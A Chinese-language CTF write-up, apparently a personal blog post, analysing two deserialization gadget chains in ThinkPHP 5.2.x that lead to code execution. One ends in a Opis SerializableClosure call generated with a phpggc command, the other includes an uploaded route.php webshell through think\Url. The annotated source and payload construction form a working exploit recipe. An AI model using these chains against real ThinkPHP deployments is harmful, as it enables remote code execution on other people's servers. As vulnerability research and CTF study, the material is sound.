---
title: thinkphp v5.2.x 反序列化利用链挖掘
tags: 
  - cms
categories: codereview
date: 2019-09-10 12:59:00
---
# 0x00 前言

上周参与了N1CTF，里面有一道关于thinkphp5的反序列化漏洞的利用。记录一下关于该反序列化的利用链分析。
<!-- more -->

后文主要包括两条链的利用分析（一条是我找的，也是题目的预期解，另一条是wonderkun师傅找的非预期解）

# 0x01 环境准备

这里就不直接用题目的环境了，采用composer直接安装5.2.*-dev版本

```bash
composer create-project topthink/think=5.2.x-dev v5.2
```

# 0x02 利用链分析

## 背景回顾

tp5在我印象里反序列化的利用链存在一个Windows类的任意文件删除，但是在[这篇文章]([https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/](https://blog.riskivy.com/挖掘暗藏thinkphp中的反序列利用链/))的启示下，也算是找到了一条新的路（关于`__toString`的触发方式，除了字符串拼接的方式，还可以利用PHP自带函数参数的强制转换）。

这篇文章的利用链最后用到了5.1.37版本`think/Request.php`的 `__call`函数，该函数的调用函数名可控，所以可以导致任意调用其他的类函数。而在5.2.x版本不存在这样的一个`__call`函数，这意味着我们需要重新找一个最终达成命令执行的函数调用（`__call`函数前的利用链仍然可用）。

那么接下来，我们来看看5.2.x新的利用链吧：）

## think/model/concern/Attribute.php getValue可函数动态调用函数（题目的预期解）

由于5.1.37`__call`函数前的利用链仍然存在于5.2.x版本，这里就不再详述了。

先来看一下Conversion类的toArray函数

```php
public function toArray(): array
{
    // ...
    // 合并关联数据
    $data = array_merge($this->data, $this->relation);

    foreach ($data as $key => $val) {
        if ($val instanceof Model || $val instanceof ModelCollection) {
            // ...
        } elseif (isset($this->visible[$key])) {
            $item[$key] = $this->getAttr($key);// relation和visible存在同一个key就行
        // ...
    }

    // ...
```

去掉了无关的代码，这里`$this->visible`、`$this->relation`均可控，可伪造数据进入`getAttr`函数

```php
public function getAttr(string $name)
{
    // ...
    return $this->getValue($name, $value, $relation);
}

protected function getValue(string $name, $value, bool $relation = false)
{
  // 检测属性获取器
  $fieldName = $this->getRealFieldName($name);// 直接返回$name的值
	// ...
  if (isset($this->withAttr[$fieldName])) {
    // ...
    $closure = $this->withAttr[$fieldName]; // withAttr内容可控
    $value   = $closure($value, $this->data); // 动态调用函数
	  // ...
```

直接关注`getValue`函数，该函数可动态调用函数，并且调用函数、函数参数均可控。所以接下来有两种方法，第一种是找一个符合条件的php函数，另一种是利用tp自带的SerializableClosure调用，来看一下第二种。

[\Opis\Closure](https://github.com/opis/closure)可用于序列化匿名函数，使得匿名函数同样可以进行序列化操作。这意味着我们可以序列化一个匿名函数，然后交由上述的`$closure($value, $this->data)`调用执行。

```php
$func = function(){phpinfo();};
$closure = new \Opis\Closure\SerializableClosure($func);
$closure($value, $this->data);// 这里的参数可以不用管
```

以上述代码为例，将调用phpinfo函数。

到此为止，我们分析完了整一个调用流程，回顾一下

1. `vendor/topthink/framework/src/think/process/pipes/Windows.php`
	 `__destruct` ->` removeFiles` ->` file_exists` 强制转化字符串`filename`，这里的`filename`可控
	可触发`__toString`函数，下一步找可利用的`__toString`
2. `vendor/topthink/framework/src/think/model/concern/Conversion.php`
	`__toString` -> `toJson` -> `toArray`创造符合条件的`relation`和`visible`-> `getAttr`
	下一步调用`vendor/topthink/framework/src/think/model/concern/Attribute.php`的`getValue`函数
3. `vendor/topthink/framework/src/think/model/concern/Attribute.php`
  `getValue` -> `$closure`动态调用函数，且该内容可控
  下一步利用有两种，一种找符合的php函数，另一种利用tp自带的`SerializableClosure`调用
4. `vendor/opis/closure/src/SerializableClosure.php`
  构造可利用的匿名函数

我把exp集成到了[phpggc](https://github.com/wh1t3p1g/phpggc)上，使用如下命令即可生成

```bash
./phpggc -u ThinkPHP/RCE1 'phpinfo();'
```

这里由于用到了SerializableClosure，需要使用编码器编码，不可直接输出拷贝利用。

## think/Db.php __call函数可实例化任意类（题目的非预期解）

前面说到5.1.37版本的利用链的`__call`函数，在5.2.x版本没办法用了。但是从`__destruct`到`__call`的链路是通的，我们只需要重新找一个可用的`__call`函数即可。

来看一下`vendor/topthink/framework/src/think/Db.php`的`__call`函数

```php
public function __call($method, $args)
{
    $class = $this->config['query'];

    $query = new $class($this->connection);

    return call_user_func_array([$query, $method], $args);
}
```

`$this->config`和`$this->connection`均可控，这意味着我们可以实例化任意符合条件的类，这里找了`think\Url`

```php
public function __construct(App $app, array $config = [])
{
    $this->app    = $app;
    $this->config = $config;

    if (is_file($app->getRuntimePath() . 'route.php')) {
        // 读取路由映射文件
        $app->route->import(include $app->getRuntimePath() . 'route.php');
    }
}
```

该构造器引入了RuntimePath下的route.php文件，因为这道题是允许上传文件的，所以只要在可上传的目录下上传一个route.php的webshell即可。至于RuntimePath，`$app`为可控变量，直接修改`$runtimePath`的内容即可。

我们直接构造App对象为

```php
class App{

    protected $runtimePath;
    public function __construct(string $rootPath = ''){
        $this->rootPath = $rootPath;
        $this->runtimePath = "/tmp/";
        $this->route = new \think\route\RuleName();
    }
}
```

这个构造思路太溜了，膜一波：）

整理一下过程

1. `vendor/topthink/framework/src/think/process/pipes/Windows.php`
   `__destruct` ->` removeFiles` ->` file_exists` 强制转化字符串`filename`，这里的`filename`可控
   可触发`__toString`函数，下一步找可利用的`__toString`
2. `vendor/topthink/framework/src/think/model/concern/Conversion.php`
   `__toString` -> `toJson` -> `toArray `->`appendAttrToArray`->`$relation`调用不存在的函数，触发`__call`
3. `vendor/topthink/framework/src/think/Db.php`
   `__call` -> `new $class($this->connection)` 调用任意类的`__construct`函数
4. `vendor/topthink/framework/src/think/Url.php`
   构造App类，达到`include`任意文件的效果